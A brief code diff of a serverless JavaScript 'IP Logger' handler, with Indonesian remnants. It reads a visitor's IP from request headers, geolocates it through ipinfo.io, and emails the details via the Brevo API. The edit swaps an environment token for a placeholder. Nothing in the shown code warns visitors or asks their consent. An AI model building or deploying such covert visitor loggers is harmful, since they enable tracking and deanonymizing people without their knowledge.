@@ -4,9 +4,10 @@ exports.handler = async (event) => {
   try {
     const ip = event.headers['x-forwarded-for']?.split(',')[0] || 'Unknown';
 
-    const { data } = await axios.get(`https://ipinfo.io/${ip}?token=${process.env.IPINFO_TOKEN}`);
+  
+    const { data } = await axios.get(`https://ipinfo.io/${ip}?token=ISI_TOKEN_DISINI`);
 
-    // Kirim email via Brevo API
+    
     await axios.post('https://api.brevo.com/v3/smtp/email', {
       sender: { name: "IP Logger", email: process.env.SENDER_EMAIL },
       to: [{ email: process.env.RECEIVER_EMAIL }],
